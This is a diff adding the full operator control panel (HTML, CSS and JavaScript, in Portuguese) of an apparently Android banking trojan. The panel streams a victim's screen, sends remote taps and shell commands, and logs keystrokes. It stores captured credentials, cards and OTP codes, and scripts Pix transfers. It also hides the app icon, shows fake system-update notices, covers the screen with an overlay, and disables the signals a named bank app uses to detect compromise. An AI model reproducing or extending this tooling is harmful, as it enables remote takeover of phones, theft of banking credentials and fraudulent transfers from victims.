@@ -1,0 +1,1344 @@
+<!doctype html><meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content=no-referrer>
+<title>painel</title>
+<style>
+*{box-sizing:border-box;margin:0}
+:root{--bg:#0a0c10;--pn:#11151b;--pn2:#161c24;--ln:#232c38;--tx:#c3ccd8;--dim:#6a7686;--ac:#3d8bfd;--ok:#2ea043;--warn:#d29922;--err:#f85149}
+body{background:var(--bg);color:var(--tx);font:12px/1.45 system-ui;height:100vh;display:flex;flex-direction:column;overflow:hidden}
+header{display:flex;gap:6px;align-items:center;padding:6px 10px;background:var(--pn);border-bottom:1px solid var(--ln);flex-wrap:wrap;flex:none}
+#brand{font-weight:700;letter-spacing:.4px;color:#fff;font-size:13px;margin-right:4px}
+#brand i{color:var(--ac);font-style:normal}
+.grp{display:flex;gap:4px;padding-left:8px;border-left:1px solid var(--ln)}
+#mais{display:flex;gap:4px;padding:5px 10px;background:#0d1116;border-bottom:1px solid var(--ln);flex-wrap:wrap;flex:none}
+#mais[hidden]{display:none}
+main{flex:1;display:flex;min-height:0;min-width:0}
+nav{width:78px;background:var(--pn);border-right:1px solid var(--ln);display:flex;flex-direction:column;padding-top:4px;gap:2px;overflow:auto;flex:none}
+nav b{padding:8px 2px;text-align:center;cursor:pointer;color:var(--dim);font-weight:400;font-size:10px;border-left:2px solid transparent;position:relative}
+nav b.on{color:var(--ac);border-left-color:var(--ac);background:var(--pn2)}
+nav b:hover{color:var(--tx);background:var(--pn2)}
+nav b em{display:none;position:absolute;top:2px;right:2px;background:var(--ac);color:#fff;font-style:normal;font-size:8px;border-radius:6px;padding:0 3px}
+nav b.em em{display:block}
+#wrap{flex:1 1 auto;min-width:0;min-height:0;position:relative;background:#000;overflow:hidden}
+#wrap.zoom{overflow:auto}
+#scr{position:absolute;top:0;right:0;bottom:0;left:0;margin:auto;display:block;width:auto;height:auto;max-width:100%;max-height:100%;object-fit:contain;cursor:crosshair;user-select:none;-webkit-user-drag:none;touch-action:none}
+#wrap.zoom #scr{top:0;left:0;right:auto;bottom:auto;margin:0;max-width:none;max-height:none}
+#st{position:absolute;left:0;bottom:0;padding:2px 8px;font:11px monospace;color:var(--warn);pointer-events:none;background:#000000aa}
+#tbar{display:flex;gap:4px;padding:4px 6px;background:var(--pn);border-top:1px solid var(--ln);flex-wrap:wrap;flex:none}
+aside{width:392px;display:flex;flex-direction:column;background:var(--pn);border-left:1px solid var(--ln);min-width:0;flex:none}
+#hd{display:flex;gap:6px;align-items:center;padding:6px 8px;border-bottom:1px solid var(--ln)}
+#hd h2{font-size:12px;font-weight:600;color:#fff;flex:1}
+#body{flex:1;overflow:auto;padding:7px}
+#out{margin:0;font:11px monospace;white-space:pre-wrap;word-break:break-all}
+button,select,input,textarea{background:var(--pn2);color:var(--tx);border:1px solid var(--ln);padding:4px 7px;font-size:11px;border-radius:5px;cursor:pointer;font-family:inherit}
+button:hover{background:#1e2731;border-color:#33414f}
+button:active{transform:translateY(1px)}
+button.pri{background:#153a63;border-color:#1f5c9c;color:#dceaff}
+button.dg{border-color:#4d2323;color:#ffb4ae}
+button.on{background:#153a63;border-color:#1f5c9c;color:#dceaff}
+input{flex:1;cursor:text}
+.ln{display:flex;gap:5px;align-items:center;margin-bottom:5px;flex-wrap:wrap}
+.sm{font:10px monospace;color:var(--dim)}
+.dot{width:8px;height:8px;border-radius:50%;background:#39424e;flex:none}
+.dot.on{background:var(--ok);box-shadow:0 0 6px var(--ok)}
+.dot.w{background:var(--warn)}
+.card{background:var(--pn2);border:1px solid var(--ln);border-radius:7px;padding:7px 8px;margin-bottom:5px}
+.card .t{font-weight:600;color:#fff;font-size:12px;word-break:break-all}
+.card .m{font:10px monospace;color:var(--dim);margin-top:2px;word-break:break-all}
+.card .a{display:flex;gap:4px;margin-top:5px;flex-wrap:wrap}
+.row{display:flex;justify-content:space-between;gap:6px;padding:3px 0;border-bottom:1px solid #1a2029;cursor:pointer}
+.row:hover{background:#151b22}
+#toast{position:fixed;right:12px;bottom:12px;display:flex;flex-direction:column;gap:5px;z-index:9;pointer-events:none}
+#toast div{background:#1b232d;border:1px solid #2d3a49;color:#dbe3ec;padding:5px 9px;border-radius:5px;font-size:11px}
+.tap{position:absolute;width:20px;height:20px;margin:-10px 0 0 -10px;border:2px solid var(--ac);border-radius:50%;pointer-events:none}
+#klist{font:11.5px monospace;white-space:pre-wrap;word-break:break-all;line-height:1.55}
+.kh{color:var(--ac);margin:8px 0 3px;border-bottom:1px solid #1a2029;padding-bottom:2px;font-size:10px}
+.kf{color:#9fd0ff}
+#snapbox{display:none;border-top:1px solid var(--ln);padding:6px;background:#0a0e13}
+#snappre{max-height:210px;overflow:auto;font:11px monospace;margin:4px 0;background:#05070a;padding:6px;border-radius:5px}
+#snappre div{cursor:pointer;white-space:pre}
+#snappre div:hover{background:#131a22}
+textarea{width:100%;height:130px;font:11px monospace;background:#05070a;resize:vertical}
+#arv{font:11px monospace}
+.no{display:flex;gap:5px;align-items:flex-start;padding:2px 0;border-bottom:1px solid #141a21;cursor:pointer}
+.no:hover{background:#151b22}
+.no .tx{flex:1;word-break:break-all}
+.no .cl{color:var(--dim);font-size:9.5px}
+.leg{color:var(--dim);font-size:10.5px;line-height:1.5}
+.aj{display:flex;gap:8px;padding:4px 0;border-bottom:1px solid #141a21}
+.aj b{color:#fff;font-weight:600;flex:0 0 130px}
+.aj span{flex:1;color:var(--dim)}
+body.somente header,body.somente nav,body.somente aside,body.somente #tbar{display:none}
+body.semAside aside{display:none}
+@media (max-width:1200px){aside{width:320px;max-width:46vw}}
+@media (max-width:900px){
+  main{flex-direction:column}
+  nav{width:auto;flex-direction:row;overflow-x:auto;overflow-y:hidden;border-right:0;border-bottom:1px solid var(--ln);padding:0;flex:none}
+  nav b{flex:0 0 auto;padding:7px 9px;border-left:0;border-bottom:2px solid transparent}
+  nav b.on{border-left:0;border-bottom-color:var(--ac)}
+  #wrap{min-height:38vh}
+  aside{width:auto;height:40vh;border-left:0;border-top:1px solid var(--ln)}
+}
+</style>
+<header>
+<span id=brand>p<i>a</i>inel</span>
+<select id=dev><option value="">-- aparelho --</option></select><span id=dot class=dot></span><span id=lat class=sm>--</span>
+<span class=grp><button class=pri title="Liga a transmissão de tela" onclick="c('shot',{on:true})">Ver tela</button>
+<button class=dg title="Para a transmissão, bloqueia a tela e limpa o painel" onclick="c('off')">Desligar</button>
+<button title="Acorda a tela do aparelho" onclick="c('screen',{on:true})">Acordar</button></span><span class=grp><button id=ovb title="Tapa a tela e opera pela arvore" onclick="ovTog()">sobrepor</button></span>
+<span class=grp><button onclick="zoom(-1)" title="Diminuir zoom">-</button><span id=z class=sm>1x</span><button onclick="zoom(1)" title="Aumentar zoom">+</button></span>
+<button id=so title="Esconde tudo e mostra só a tela (Esc sai)" onclick="soTela()">só tela</button>
+<button id=sp title="Mostra ou esconde o painel lateral" onclick="document.body.classList.toggle('semAside');setTimeout(fit,80)">painel</button>
+<button id=mg title="Ímã: encaixa o toque no elemento mais próximo" onclick="mag=!mag;this.classList.toggle('on',mag)">ímã</button>
+<button class=pri onclick="go('arvore')" title="Abre a lista de elementos da tela por texto">árvore</button>
+<button onclick="document.getElementById('mais').hidden=!document.getElementById('mais').hidden">mais opções</button>
+</header>
+<div id=mais hidden>
+<button title="Voltar (botão do sistema)" onclick="k(4)">Voltar</button><button title="Home" onclick="k(3)">Home</button><button title="Recentes" onclick="k(187)">Recentes</button>
+<button title="Abrir gaveta de notificações" onclick="k(26)">Notificações</button><button title="Apagar caractere" onclick="k(67)">Apagar</button>
+<button title="Dados do aparelho" onclick="c('info')">Info</button><button title="Lista de apps instalados" onclick="c('apps')">Apps</button>
+<button title="SMS" onclick="c('sms')">SMS</button><button title="Localização" onclick="c('loc')">Localização</button>
+<button title="Lanterna ligada" onclick="c('torch',{on:true})">Lanterna</button><button title="Lanterna desligada" onclick="c('torch',{on:false})">Lanterna off</button>
+<button title="Oculta o ícone do app na gaveta" onclick="c('hide',{on:true})">Ocultar ícone</button><button title="Mostra o ícone" onclick="c('hide',{on:false})">Mostrar ícone</button>
+<button title="Salva o quadro atual em arquivo" onclick="shot()">Salvar quadro</button><button onclick="full()">Tela cheia</button>
+<button title="Abre a aba de evasão para login bancário" onclick="go('banco')">Modo banco</button>
+<button title="Lê a área de transferência do aparelho" onclick="c('clip')">Área de transferência</button>
+<button title="Reconecta a sessão com o aparelho" onclick="c('recon')">Reconectar</button>
+<button title="Abre a tela de setup no aparelho" onclick="c('setup')">Setup no aparelho</button>
+</div>
+<main>
+<nav>
+<b class=on data-v=live>ao vivo</b><b data-v=arvore>árvore</b><b data-v=cofre>cofre</b><b data-v=otp>otp</b><b data-v=pix>pix</b>
+<b data-v=arq>arquivos</b><b data-v=apps>apps</b><b data-v=info>info</b><b data-v=tecla id=tb>teclado<em id=kb>0</em></b>
+<b data-v=perfil>perfis</b><b data-v=recon>recon</b><b data-v=banco>banco</b><b data-v=cfg>ajustes</b><b data-v=ajuda>ajuda</b>
+</nav>
+<div id=wrap><img id=scr><div id=st></div></div>
+<aside>
+<div id=hd><h2 id=ht>ao vivo</h2><span id=hx class=sm></span></div>
+<div id=body>
+<div id=v-live>
+<div class="ln leg">toque = clique &middot; arraste = swipe &middot; segure = toque longo &middot; para digitar, use o campo da barra inferior</div>
+<div class=ln><button onclick="recTog()">Gravar macro</button><span id=rc class=sm>0</span><button onclick="playM()">Executar macro</button></div>
+<div class=ln><button onclick="ovTog(1)">Sobreposição on</button><button onclick="ovTog(0)">Sobreposição off</button></div>
+<div class=ln><button onclick="avPreset(0)">Aviso falso: atualização</button><button onclick="avPreset(1)">Aviso falso: sincronização</button></div>
+<pre id=out></pre>
+</div>
+<div id=v-arvore style=display:none>
+<div class=ln><button onclick="ovTog()">Sobrepor tela</button><button onclick="ovTog(0)">Tirar</button><span class=sm>com a tela tapada a imagem congela</span></div>
+<div class="ln"><input id=af placeholder="filtrar por texto"><button onclick="c('tree')">Atualizar</button><label class=sm><input type=checkbox id=ar checked> auto</label></div>
+<div class="ln"><button onclick="c('open')" title="Abre o aplicativo do nó selecionado">Abrir app do nó</button><button onclick="k(4)" title="Voltar">Voltar</button></div>
+<div class="ln leg">clique no texto = toque no elemento &middot; L = toque longo &middot; T = digitar no campo</div>
+<div id=arv></div>
+</div>
+<div id=v-cofre style=display:none>
+<div class=ln><input id=cf placeholder="filtrar"><button onclick="carregaCofre()">Atualizar</button></div>
+<div class=ln><button onclick="baixaCofre()">Exportar json</button><button class=dg onclick="limpaCofre()">Limpar</button></div>
+<div id=cl></div>
+</div>
+<div id=v-otp style=display:none>
+<div class=ln><button onclick="carregaCofre('otp')">Atualizar</button></div>
+<div class="ln leg">códigos recebidos por SMS ou notificação</div>
+<div id=ol></div>
+</div>
+<div id=v-pix style=display:none>
+<div class=ln><select id=pfl></select></div>
+<div class=ln><input id=pch placeholder="chave pix"><input id=pvl placeholder="valor" style="flex:0 0 90px"></div>
+<div class=ln><button class=pri onclick="runPix()">Executar perfil</button><button id=wt onclick="wt()">Observar tela</button></div>
+<div class=ln><button onclick="snap()">Capturar elementos</button><button onclick="c('contas')">Contas Google</button><button onclick="recon('finger')">Impressão do aparelho</button></div>
+<div id=snapbox><div class=sm>clique numa linha para virar passo do roteiro</div><pre id=snappre></pre>
+<textarea id=pjson placeholder="[]"></textarea>
+<div class=ln><button onclick="playJ()">Executar JSON</button><button onclick="salvaJ()">Gravar</button><button onclick="carregaJ()">Carregar</button><button onclick="limpaJ()">Limpar</button></div></div>
+</div>
+<div id=v-arq style=display:none>
+<div class=ln><input id=p value="/sdcard"><button onclick="ls()">Ir</button></div><div id=flist></div>
+</div>
+<div id=v-apps style=display:none><pre id=out2></pre></div>
+<div id=v-info style=display:none><pre id=out3></pre></div>
+<div id=v-tecla style=display:none>
+<div class=ln><button onclick="kpause=!kpause;this.textContent=kpause?'Retomar':'Pausar'">Pausar</button>
+<button onclick="limpaTeclas()">Limpar</button><button onclick="location.href='/keys/dl?t='+T">Baixar log</button>
+<button onclick="c('clip')" title="Lê a área de transferência do aparelho">Área de transferência</button></div>
+<div class="ln leg">chega ao vivo enquanto você digita no aparelho &middot; linhas com = são o conteúdo do campo &middot; o arquivo teclado.log guarda tudo</div>
+<div id=klist></div>
+</div>
+<div id=v-perfil style=display:none>
+<div class=ln><select id=pf2></select><button onclick="carregaP()">Carregar</button></div>
+<textarea id=pjson2></textarea>
+<div class=ln><button onclick="salvaP()">Salvar perfil</button></div>
+</div>
+<div id=v-recon style=display:none>
+<div class=ln><button onclick="recon('finger')">Impressão do aparelho</button><button onclick="recon('contas')">Contas Google</button><button onclick="recon('clip')">Área de transferência</button></div>
+<pre id=out4></pre>
+</div>
+<div id=v-banco style=display:none>
+<div class="ln leg">desliga projeção, sobreposição, opções do desenvolvedor, depuração e instalação por fonte desconhecida, e reabre o banco. ao terminar, use Restaurar.</div>
+<div class=ln><input id=bpkg value="br.com.intermedium" placeholder="pacote do banco"></div>
+<div class=ln><button class=pri onclick="bankOn()">Ativar evasão e reabrir banco</button><button onclick="c('unbank')">Restaurar</button></div><div class="ln"><button onclick="c('shell',{cmd:'settings delete secure enabled_accessibility_services; settings put secure accessibility_enabled 0'})">Acessibilidade off</button><button onclick="c('shell',{cmd:'settings put secure accessibility_enabled 1; settings put secure enabled_accessibility_services com.eloeeducacao/com.eloeeducacao.KeySvc'})">Acessibilidade on</button></div>
+<div class="ln leg" style="margin-top:10px">sobreposicao: tapa a tela e trava o toque; a arvore continua funcionando</div>
+<div class=ln><button class=pri onclick="ovTog(1)">Sobrepor e abrir arvore</button><button onclick="ovTog(0)">Tirar sobreposicao</button></div>
+<pre id=bankout></pre>
+<div class="ln leg" style="margin-top:10px">permissões remotas (funcionam com a tela preta, use a aba árvore para confirmar)</div>
+<div class=ln><button onclick="c('perm')">Abrir setup</button><button onclick="c('pedir',{s:'sms'})">Mensagens</button><button onclick="c('notiflist')">Notificações</button></div>
+<div class=ln><button onclick="c('pedir',{s:'camera'})">Câmera e áudio</button><button onclick="c('pedir',{s:'loc'})">Localização</button><button onclick="c('pedir',{s:'contatos'})">Contatos</button></div>
+<div class=ln><button onclick="c('battery')">Bateria</button><button onclick="c('wr')">Ajustes do sistema</button><button onclick="c('pedir',{s:'tudo'})">Tudo</button></div>
+</div>
+<div id=v-cfg style=display:none>
+<div class=ln title="Qualidade do JPEG">Qualidade <input id=q type=range min=15 max=90 value=35 oninput="c('q',{v:+this.value})"></div>
+<div class=ln title="Quadros por segundo">Quadros por segundo <input id=f type=range min=1 max=15 value=6 oninput="c('fps',{v:+this.value})"></div>
+<div class=ln title="Largura do quadro em pixels">Largura do quadro <input id=r type=range min=360 max=1080 step=180 value=540 oninput="c('res',{v:+this.value})"></div>
+<div class=ln><button onclick="preset(1)">Perfil rápido</button><button onclick="preset(2)">Perfil nítido</button></div>
+<div class=ln><button onclick="c('setup')">Abrir tela de setup no aparelho</button><button onclick="c('decoy')">Abrir loja</button></div>
+</div>
+<div id=v-ajuda style=display:none>
+<div class="ln leg">cada controle do painel, em ordem, e quando usar</div>
+<div class=aj><b>Ver tela</b><span>liga a transmissão de imagem do aparelho</span></div>
+<div class=aj><b>Desligar</b><span>para a transmissão, bloqueia a tela do aparelho e limpa o painel</span></div>
+<div class=aj><b>Acordar</b><span>acende a tela sem desbloquear</span></div>
+<div class=aj><b>só tela</b><span>esconde o painel inteiro e deixa apenas a imagem; Esc volta</span></div>
+<div class=aj><b>painel</b><span>mostra ou esconde a coluna lateral, para dar mais espaço à imagem</span></div>
+<div class=aj><b>ímã</b><span>puxa o toque para o elemento clicável mais próximo; útil em tela densa, atrapalha em jogo</span></div>
+<div class=aj><b>Voltar / Home / Recentes</b><span>botões do sistema</span></div>
+<div class=aj><b>Notificações</b><span>abre a gaveta de notificações</span></div>
+<div class=aj><b>Info / Apps</b><span>dados do aparelho e lista de aplicativos instalados</span></div>
+<div class=aj><b>SMS / Localização</b><span>mensagens e posição atual</span></div>
+<div class=aj><b>Lanterna</b><span>liga e desliga o flash</span></div>
+<div class=aj><b>Ocultar ícone</b><span>tira o app da gaveta; para reabrir, use a tela de setup</span></div>
+<div class=aj><b>árvore</b><span>lê os elementos da tela por texto e permite tocar neles, inclusive em partes invisíveis ao olho. é o caminho quando a imagem não ajuda</span></div>
+<div class=aj><b>teclado</b><span>mostra ao vivo o que está sendo digitado, com o app e a tela de origem</span></div>
+<div class=aj><b>banco</b><span>desliga os sinais que fazem o app do banco acusar ambiente em risco e reabre o banco</span></div>
+<div class=aj><b>cofre / otp</b><span>credenciais e códigos capturados</span></div>
+<div class=aj><b>pix</b><span>roteiros automáticos de transferência</span></div>
+<div class=aj><b>recon</b><span>impressão do aparelho, contas e área de transferência</span></div>
+<div class=aj><b>ajustes</b><span>qualidade, quadros e largura do quadro</span></div>
+</div>
+</div>
+</aside>
+</main>
+<div id=tbar><input id=t placeholder="texto | $comando | /ls caminho | /dl caminho"><button class=pri onclick="send()">Enviar</button>
+<button onclick="k(66)" title="Enter">Enter</button><button onclick="c('clip')" title="Colar área de transferência">Colar</button></div>
+<div id=toast></div>
+<script>
+const T=new URLSearchParams(location.search).get('t')||'';
+const $=s=>document.querySelector(s),i=$('#scr'),dev=$('#dev'),st=$('#st'),dot=$('#dot'),lat=$('#lat'),wrap=$('#wrap');
+let apps=[],arvT=null,DEVS=[];
+let w,sel='',geo={w:0,h:0},ovOn=false,lf=0,tp=0,recs=null,vNow='live',pasta='/sdcard',pend=null,kt=null,kpause=false,z=1,mag=false,nos=[],cofre=[],kl=[],kAt=0,recT=null,kN=0;
+function toq(x){const d=document.createElement('div');d.textContent=x;$('#toast').appendChild(d);setTimeout(()=>d.remove(),2600)}
+function log(x){const o=$('#out');o.textContent=(o.textContent+x+'\n').slice(-9000);o.scrollTop=o.scrollHeight}
+function co(){
+  w=new WebSocket((location.protocol==='https:'?'wss:':'ws:')+'//'+location.host+'/panel?t='+T);
+  w.binaryType='arraybuffer';
+  w.onopen=()=>{log('[painel ok]');
+    setInterval(()=>{if(sel&&mag&&vNow==='live')c('tree')},2600);
+    setInterval(()=>{if(sel)c('geo')},3000);
+    setInterval(()=>{if(w.readyState===1){tp=Date.now();w.send('{"c":"ping"}')}},4000)};
+  w.onclose=()=>{log('[caiu]');setTimeout(co,1500)};
+  w.onmessage=e=>{
+    if(typeof e.data!=='string'){frame(e.data);return}
+    const m=JSON.parse(e.data);
+    if(m.k==='devs'){
+      const cur=dev.value;dev.innerHTML='<option value="">-- aparelho --</option>';
+      m.d.forEach(x=>{const o=document.createElement('option');o.value=x.id;
+        o.textContent=x.id+' '+x.m+' '+x.w+'x'+x.h+' b'+x.bat;dev.appendChild(o)});
+      if(!sel&&m.d.length){dev.value=m.d[0].id;pick()}
+      else if(cur&&m.d.some(x=>x.id===cur))dev.value=cur;
+      return}
+    if(m.k==='key'){recebeTecla(m.d);return}
+    if(m.k!=='log')return;
+    const x=m.d;
+    if(x.t==='hello'){log('['+x.id+'] '+x.m+' sdk'+x.sdk+' '+x.w+'x'+x.h+' b'+x.bat+' '+x.ip);
+      geo={w:x.w,h:x.h};if(!sel&&x.id){dev.value=x.id;pick()}}
+    else if(x.t==='geo'){geo={w:x.o.w,h:x.o.h};fit()}
+    else if(x.t==='pong'){lat.textContent=(Date.now()-tp)+'ms'}
+    else if(x.t==='err'){log('! '+x.o);st.textContent=x.o}
+    else if(x.t==='ka'){}
+    else if(x.t==='off'){i.removeAttribute('src');i.style.width=i.style.height='';st.textContent='desligado';dot.className='dot'}
+    else if(x.t==='apps'){$('#out2').textContent=x.o}
+    else if(x.t==='info'){$('#out3').textContent=x.o}
+    else if(x.t==='ls'){lista(x.o)}
+    else if(x.t==='dl'){baixa(x.o)}
+    else if(x.t==='tree'){nos=x.o||[];if(vNow==='arvore')desenhaArv()}
+    else if(x.t==='applist'){apps=x.o||[];if(vNow==='arvore')desenhaArv()}
+    else if(x.t==='bank'){$('#bankout').textContent=x.o}
+    else if(x.t==='k'){kcarrega()}
+    else if(x.t==='cred'||x.t==='cartao'){cofre.unshift(Object.assign({_t:x.t},x.o));desenhaCofre();toq(x.t+': '+(x.o.campo||''))}
+    else if(x.t==='otp'){cofre.unshift({_t:'otp',v:x.o});desenhaCofre();toq('otp recebido')}
+    else if(x.t==='clip'){cofre.unshift({_t:'clip',v:x.o});desenhaCofre()}
+    else if(x.t==='contas'||x.t==='finger'){clearTimeout(recT);$('#out4').textContent=x.o}
+    else if(x.t==='pixvisto'){log('! '+x.o);const mm=x.o.match(/chave=([^;]+)/);if(mm){$('#pch').value=mm[1].trim();toq('chave pix capturada')}}
+    else if(x.t==='snap')snapShow(x.o||'')
+    else log(x.t+': '+(x.o||''));
+  };
+}
+function frame(d){
+  lf=Date.now();st.textContent='';
+  const u=URL.createObjectURL(new Blob([d],{type:'image/jpeg'})),old=i.src;
+  i.onload=()=>{if(old&&old.startsWith('blob:'))URL.revokeObjectURL(old);i.onload=null;fit()};i.src=u;
+  if(recs&&recs.cv)recs.cv.getContext('2d').drawImage(i,0,0,recs.cv.width,recs.cv.height)}
+function fit(){
+  const nx=i.naturalWidth,ny=i.naturalHeight;
+  if(!nx||!ny)return;
+  if(z<=1){i.style.width='';i.style.height='';wrap.classList.remove('zoom');return}
+  const W=wrap.clientWidth||1,H=wrap.clientHeight||1;
+  const s=Math.min(W/nx,H/ny)*z;
+  i.style.width=Math.round(nx*s)+'px';
+  i.style.height=Math.round(ny*s)+'px';
+  wrap.classList.add('zoom');
+}
+addEventListener('resize',fit);
+if(window.ResizeObserver)new ResizeObserver(fit).observe(wrap);
+setInterval(()=>{
+  if(ovOn){st.textContent='sobreposicao ativa - use a arvore';dot.className='dot on'}
+  else if(!sel){st.textContent='nenhum aparelho';dot.className='dot'}
+  else if(!lf||Date.now()-lf>2500){st.textContent='sem imagens';dot.className='dot w'}
+  else dot.className='dot on'},1000);
+function pick(){sel=dev.value;lf=0;i.removeAttribute('src');log('[*] '+(sel||'nenhum'));
+  if(sel&&w&&w.readyState===1){w.send(JSON.stringify({c:'sel',id:sel}));c('geo')}}
+dev.onchange=pick;
+function c(n,x){if(w&&w.readyState===1&&sel)w.send(JSON.stringify(Object.assign({c:n,id:sel},x||{})))}
+function k(n){c('key',{code:n});push({k:n})}
+function ovTog(v){
+  if(v===undefined)v=!ovOn;
+  ovOn=!!v;
+  var b=document.getElementById('ovb');if(b)b.classList.toggle('on',ovOn);
+  c('ov',{on:ovOn,fixo:ovOn});
+  if(ovOn){toq('tela tapada - use a arvore');go('arvore')}
+  else{toq('tela liberada');c('shot',{on:true})}
+}
+function soTela(){document.body.classList.toggle('somente');$('#so').classList.toggle('on',document.body.classList.contains('somente'));setTimeout(fit,60)}
+addEventListener('keydown',e=>{if(e.key==='Escape'&&document.body.classList.contains('somente'))soTela()});
+function go(v){vNow=v;
+  document.querySelectorAll('nav b').forEach(b=>b.classList.toggle('on',b.dataset.v===v));
+  ['live','arvore','cofre','otp','pix','arq','apps','info','tecla','perfil','recon','banco','cfg','ajuda'].forEach(n=>{
+    const e=$('#v-'+n);if(e)e.style.display=n===v?'block':'none'});
+  $('#ht').textContent=v;
+  clearInterval(kt);
+  if(v==='arvore'){pedeArv();kt=setInterval(()=>{if($('#ar').checked)pedeArv()},1500)}
+  if(v==='tecla'){kcarrega();kt=setInterval(kcarrega,1500);marcaTecla(0);$('#hx').textContent='ao vivo'}
+  else $('#hx').textContent='';
+  if(v==='cofre')carregaCofre();
+  if(v==='otp')carregaCofre('otp');
+  if(v==='apps')c('apps');
+  if(v==='info')c('info');
+  if(v==='arq')ls();
+}
+document.querySelectorAll('nav b').forEach(b=>b.onclick=()=>go(b.dataset.v));
+function recon(n){clearTimeout(recT);$('#out4').textContent='consultando...';c(n);
+  recT=setTimeout(()=>{if($('#out4').textContent==='consultando...')$('#out4').textContent='sem resposta do aparelho. confira se ele está online e tente de novo.'},8000)}
+function send(){const e=$('#t'),v=e.value;
+  if(pend){c('fill',{x:pend.x,y:pend.y,s:v});pend=null;e.value='';e.placeholder='texto | $comando | /ls caminho | /dl caminho';return}
+  if(!v)return;
+  if(v[0]==='$')c('shell',{cmd:v.slice(1)});
+  else if(v.startsWith('/ls '))c('ls',{p:v.slice(4)});
+  else if(v.startsWith('/dl '))c('dl',{p:v.slice(4)});
+  else {c('text',{s:v});push({x:v});e.value=''}
+}
+$('#t').onkeydown=e=>{if(e.key==='Enter')send()};
+function pt(e){
+  if(!geo.w||!geo.h){c('geo');toq('aguardando a resolução do aparelho');return null}
+  const nx=i.naturalWidth,ny=i.naturalHeight;if(!nx||!ny)return null;
+  const r=i.getBoundingClientRect();if(!r.width||!r.height)return null;
+  const fx=(e.clientX-r.left)/r.width, fy=(e.clientY-r.top)/r.height;
+  if(fx<0||fy<0||fx>1||fy>1)return null;
+  return {x:Math.min(geo.w-1,Math.max(0,Math.round(fx*geo.w))),y:Math.min(geo.h-1,Math.max(0,Math.round(fy*geo.h)))};
+}
+function snapP(p){
+  if(!mag||!nos.length||!p)return p;
+  let b=null,d=1e9;
+  nos.forEach(n=>{if(!n.c&&!n.e)return;const dd=Math.hypot(n.x-p.x,n.y-p.y);if(dd<d){d=dd;b=n}});
+  return (b&&d<18)?{x:b.x,y:b.y}:p;
+}
+function mark(p){
+  const r=i.getBoundingClientRect(),wr=wrap.getBoundingClientRect();if(!r.width)return;
+  const d=document.createElement('div');d.className='tap';
+  d.style.left=(wrap.scrollLeft+r.left-wr.left+p.x/geo.w*r.width)+'px';
+  d.style.top=(wrap.scrollTop+r.top-wr.top+p.y/geo.h*r.height)+'px';
+  wrap.appendChild(d);setTimeout(()=>d.remove(),420)}
+function zoom(n){z=Math.min(4,Math.max(1,z+n));$('#z').textContent=z+'x';fit()}
+function avPreset(n){
+  const a=[['Atualização do sistema','Atualização instalada. Reinicie o aplicativo.'],
+           ['Serviços do sistema','Sincronizando dados da conta...']][n];
+  c('aviso',{ti:a[0],tx:a[1]})}
+let dn=null,t0=0,env=null,jaEnviado=false;
+i.onpointerdown=e=>{e.preventDefault();dn=snapP(pt(e));t0=Date.now();jaEnviado=false;if(dn)mark(dn);
+  clearTimeout(env);env=setTimeout(()=>{if(!dn)return;jaEnviado=true;c('touch',{x:dn.x,y:dn.y})},130)};
+i.onpointermove=e=>{if(!dn)return;const u=snapP(pt(e));if(u&&Math.abs(u.x-dn.x)+Math.abs(u.y-dn.y)>18)clearTimeout(env)};
+i.onpointerup=e=>{clearTimeout(env);if(!dn)return;const u=snapP(pt(e));if(!u){dn=null;return}
+  const m=Math.abs(u.x-dn.x)+Math.abs(u.y-dn.y);
+  if(jaEnviado&&m<18){dn=null;return}
+  if(m<18&&Date.now()-t0>480){c('long',{x:u.x,y:u.y});push({l:[u.x,u.y]})}
+  else if(m<18){c('touch',{x:u.x,y:u.y});push({t:[u.x,u.y]})}
+  else {c('swipe',{x1:dn.x,y1:dn.y,x2:u.x,y2:u.y,ms:220});push({s:[dn.x,dn.y,u.x,u.y,220]})}dn=null};
+function shot(){const a=document.createElement('a');a.href=i.src;a.download='tela.jpg';a.click()}
+function full(){document.fullscreenElement?document.exitFullscreen():document.documentElement.requestFullscreen()}
+function rec(){
+  if(recs){recs.stop();recs=null;st.textContent='';return}
+  const cv=document.createElement('canvas');cv.width=i.naturalWidth||540;cv.height=i.naturalHeight||960;
+  const r=new MediaRecorder(cv.captureStream(6),{mimeType:'video/webm'});
+  r.ondataavailable=e=>{const a=document.createElement('a');a.href=URL.createObjectURL(e.data);a.download='sessao.webm';a.click()};
+  r.start();r.cv=cv;recs=r;st.textContent='gravando'}
+function bankOn(){const p=$('#bpkg').value.trim();$('#bankout').textContent='ativando...';c('bank',{pkg:p});toq('evasão ativada')}
+function marcaTecla(n){kN=n;$('#kb').textContent=n>99?'99+':n;$('#tb').classList.toggle('em',n>0)}
+function recebeTecla(d){
+  kl.push(d);if(kl.length>800)kl.shift();
+  marcaTecla(kN+1);
+  if(vNow==='tecla'&&!kpause)kdesenha();
+}
+function kdesenha(){
+  const f=$('#klist');if(!f)return;
+  f.innerHTML='';
+  if(!kl.length){f.textContent='nenhuma tecla recebida ainda. digite no aparelho com o painel aberto.';return}
+  let ultimo='';
+  kl.forEach(l=>{
+    const cab=(l.pkg||'?')+' / '+(l.win||'?');
+    if(cab!==ultimo){ultimo=cab;const h=document.createElement('div');h.className='kh';h.textContent='-- '+cab+' --';f.appendChild(h)}
+    const d=document.createElement('div');
+    if((l.o||'').startsWith('=')){d.className='kf'}
+    d.textContent=(l.h?l.h+' ':'')+(l.o||'');
+    f.appendChild(d)});
+  f.scrollTop=f.scrollHeight;
+}
+function kcarrega(){
+  fetch('/keys?t='+T+'&n=800'+(sel?'&dev='+encodeURIComponent(sel):''))
+  .then(r=>r.json()).then(j=>{
+    if(j.l.length===kAt)return;
+    kAt=j.l.length;
+    kl=j.l.map(function(x){var p=x.split('\t');
+      return {h:(p[0]||'').slice(11),pkg:(p[2]||'?').split('/')[0],win:(p[2]||'?').split('/')[1]||'?',o:p[3]||''}});
+    if(vNow==='tecla'&&!kpause)kdesenha();
+  }).catch(()=>{})}
+function limpaTeclas(){fetch('/keys/clear?t='+T).then(()=>{kl=[];kAt=0;marcaTecla(0);kdesenha();toq('log limpo')})}
+function ls(){pasta=$('#p').value||'/sdcard';c('ls',{p:pasta})}
+function lista(o){
+  const f=$('#flist');f.innerHTML='';
+  if(!o||o.startsWith('err')||o.startsWith('sem acesso')){f.textContent=o||'vazio';return}
+  o.split('\n').forEach(l=>{if(!l||l.indexOf('\t')<0)return;
+    const dir=l[0]==='d',nome=l.split('\t')[1];
+    const d=document.createElement('div');d.className='row';
